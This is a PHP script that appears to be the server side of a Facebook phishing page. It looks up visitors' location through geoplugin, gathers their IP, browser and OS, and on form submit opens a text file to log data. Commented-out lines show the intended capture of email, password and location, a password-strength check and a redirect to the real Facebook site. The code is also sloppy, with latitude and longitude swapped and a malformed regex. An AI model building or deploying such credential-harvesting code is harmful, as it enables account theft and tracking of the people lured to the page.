<?php
    // Get a Visitor Location Details using IP Address PHP Function
function getLocationByIp(){  
    $client_ip  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward_ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote_ip  = @$_SERVER['REMOTE_ADDR'];
    $result  = array('countryCode'=>'', 'countryName'=>'', 'region'=>'', 'city'=>'',
    'Longitude'=>'', 'Latitude'=>'', 'timezone'=>'', 'currency'=>'');
    if(filter_var($client_ip, FILTER_VALIDATE_IP)){
        $ip_address = $client_ip;
    }elseif(filter_var($forward_ip, FILTER_VALIDATE_IP)){
        $ip_address = $forward_ip;
    }else{
        $ip_address = $remote_ip;
    }
    $loc_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip_address));    
    if($loc_data && $loc_data->geoplugin_countryName != null){
        $result['countryCode'] = $loc_data->geoplugin_countryCode;
        $result['countryName'] = $loc_data->geoplugin_countryName;
        $result['region'] = $loc_data->geoplugin_region;
        $result['city'] = $loc_data->geoplugin_city;
        $result['Longitude'] = $loc_data->geoplugin_latitude_city;
        $result['Latitude'] = $loc_data->geoplugin_longitude_city;
        $result['timezone'] = $loc_data->geoplugin_timezone_city;
        $result['currency'] = $loc_data->geoplugin_currencyCode;
    }else{
        $result['countryCode'] = 'US';
    }
    return $result;
}

$loc = getLocationByIp();
$countryCode = $loc['countryCode'];
$countryCode2 = $loc['countryName'];
$countryCode3 = $loc['region'];
$countryCode4 = $loc['city'];
$countryCode5 = $loc['Longitude'];
$countryCode6 = $loc['Latitude'];
$countryCode7 = $loc['timezone'];
$countryCode8 = $loc['currency'];

    $ip=$_SERVER['REMOTE_ADDR'];
    $host_name = gethostname();
    $brows = $_SERVER['HTTP_USER_AGENT'];
    $os = php_uname();

    // $APIf = rand(0,50);
    echo "\n";

            function get_ipaddr() {
    $keys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');

    foreach ($keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                if (filter_var($ip, FILTER_VALIDATE_IP) !== false) {
                    echo $ip;
                    return $ip;
                }
            }
        }
    }
}

$testing = get_ipaddr();

    if (isset($_POST['submit'])) {
$_SESSION['eksekusi'] ="benar" ;
   $file=fopen("../tmp/database_auth.txt","a");
        extract($_REQUEST);
    // fwrite($file,"Email, Username or Phone Number : ");
    // fwrite($file, $email ."\n");
    // fwrite($file,"Password : ");
    // fwrite($file, $password ."\n"); 
    // if ($email = "_" && $password = "_") {
    // fwrite($file,"(NOTES USER INPUT UNDERSOCRE USER) IP Adress : ");
    // fwrite($file, $testing ."\n\n");
    // }
    // fwrite($file,"Time Stamp : ");
    // fwrite($file, date("Y-m-d H:i:s" . "\n"));
    // fwrite($file,"countryCode : ");
    // fwrite($file, $countryCode ."\n");
    // fwrite($file,"countryName :");
    // fwrite($file, $countryCode2 ."\n");
    // fwrite($file,"region :");
    // fwrite($file, $countryCode3 ."\n");
    // fwrite($file,"city :");
    // fwrite($file, $countryCode4 ."\n");
    //  fwrite($file,"Latitude & Longitude Address : ");
    // fwrite($file, $countryCode5 . $countryCode6 . "," ."\n");
    // fwrite($file,"Time Zone :");
    // fwrite($file, $countryCode7 ."\n");
    // fwrite($file,"currency :");
    // fwrite($file, $countryCode8 ."\n");
    // fwrite($file,"hostname :");
    // fwrite($file, $host_name ."\n");
    // fwrite($file,"Browser :");
    // fwrite($file, $brows ."\n");
    // fwrite($file,"OS & Server :");
    // fwrite($file, $os ."\n");

    // $APIf = true;
    //   if ($APIf) {
    //             if (!preg_match('/[#$%^&*()\-/^\S+$/\[\]]/', $email) && preg_match('/(?=^[!-~]{8,}$)(?=.*[a-z])(?=.*[A-Z])(?=.*[^A-Za-z0-9])(?=^.*[^\s].*$)(?=.*[\d]).*$/', $password))   {
    //              $p = "%";    
    //             // $APIf = "Account Verified" . " (60" . $p . " accuracy rate) : Yes (Redirect FB";
    //             echo "\n";
    //              $APIf = "Status : Regex Valid";
    //             $results = "Input : Valid Standar Facebook";
    //             header("Location: https://www.facebook.com/");
    //             session_destroy();
    //          }
    //             else {
    //                    $p = "%";
    //             // $APIf = "Account Verified" . " (60" . $p . " accuracy rate) : No (Login Looping Authentication)";
    //             echo "\n"; 
    //             $results = "Account Trusted : No (Email & Password Not Match!!!)";
    //             $APIf = "Email & Password : Not Valid Standar Facebook";

    //         }
    //     fwrite($file,"OS & Server :");
    // fwrite($file, $APIf ."\n");
    // fclose($file);
}         

 ?>